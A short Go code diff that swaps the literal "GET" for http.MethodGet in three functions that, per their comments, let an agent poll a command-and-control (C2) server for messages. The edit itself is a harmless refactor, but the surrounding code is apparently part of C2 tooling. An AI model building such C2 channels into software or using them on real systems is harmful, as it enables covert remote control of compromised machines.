@@ -13,7 +13,7 @@ import (
 const MESSAGE_STREAM_SEPARATOR = "\r\r\r\r\r"
 
 func AgentMessagesSubscribe(agentID string, messageCallback func(message Message), messageDeserializationFailedCallback func(messageBuffer string, err error), shouldExit func() (exit bool)) (err error) {
-	req, err := http.NewRequest("GET", *BaseURL+"/v1/messages/live/"+agentID, nil)
+	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/messages/live/"+agentID, nil)
 	if err != nil {
 		return err
 	}
@@ -69,7 +69,7 @@ func AgentMessagesSubscribe(agentID string, messageCallback func(message Message
 
 // FetchMessages will reach out to C2 server and fetch messages.
 func FetchMessages(agentID string) (messages []Message, err error) {
-	req, err := http.NewRequest("GET", *BaseURL+"/v1/messages/"+agentID, nil)
+	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/messages/"+agentID, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -90,7 +90,7 @@ func FetchMessages(agentID string) (messages []Message, err error) {
 
 // AgentFetchMessages will reach out to C2 server and fetch messages to which it has not reponded.
 func AgentFetchMessages(agentID string) (messages []Message, err error) {
-	req, err := http.NewRequest("GET", *BaseURL+"/v1/messages/"+agentID, nil)
+	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/messages/"+agentID, nil)
 	if err != nil {
 		return nil, err
 	}
